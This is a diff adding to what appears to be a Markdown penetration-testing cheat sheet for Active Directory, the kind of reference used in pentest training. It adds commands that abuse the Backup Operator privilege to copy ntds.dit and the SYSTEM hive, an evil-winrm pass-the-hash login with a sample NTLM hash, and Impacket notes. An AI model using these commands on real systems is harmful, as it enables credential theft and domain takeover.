@@ -97,6 +97,19 @@ Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-f
 pypykatz lsa minidump lsass.DMP
 ```
 
+## Domain Escalation
+[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)
+```
+whoami /all (SeBackupPrivilege Enabled)
+
+diskshadow /s backup.txt
+robocopy /b E:\Windows\ntds . ntds.dit (NTDS file)
+reg save hklm\system c:\temp\system.bak (System Hive keys)
+
+## Other Resources
+https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58
+```
+
 -----------------------------------------------------------------------
 
 ## Active Directory Tools
@@ -121,12 +134,21 @@ smbclient.py (Impacket)
 [NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)
 [SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)
 
-## Impacket Tools
+**WinRM**
+[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
+```
+evil-winrm -i 10.10.10.192 -u "svc_backup" -H "9658d1d1dcd9250115e2205d9f48400d"
+```
+
+[Impacket]()
+```
+python3 -m pipx install impacket
   - **PSExec**
     - Shell access via SMB shares (Pass the Hash) 
   - **GetNPUsers**
     - Kerberos Pre-authentication disabled (ASREPRoasting)
- 
+```
+
 ## Resources
  - [The Hacker Recipes](https://www.thehacker.recipes/)
  - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
